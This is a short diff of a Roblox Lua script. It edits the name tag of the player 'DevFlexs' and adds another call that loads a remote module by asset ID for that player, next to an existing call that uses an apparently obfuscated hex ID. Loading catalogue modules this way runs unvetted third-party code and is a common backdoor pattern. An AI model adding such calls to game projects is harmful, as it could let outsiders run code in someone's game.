@@ -5,7 +5,7 @@ game.Players["DevFlexs"].Character.Head.NameTag.NameFln.Text = ""
 ---game.Players["DevFlexs"].Character.Head.NameTag.NameFln.TextColor3 = Color3.new(24, 0, 0)
 require(110476458714336).ipadgui("DevFlexs")
 spawn(function()
-
+require(5702244094).space("DevFlexs")
 require(0x22330bb15).Hotladiesinyourarea("DevFlexs")
 end)
 
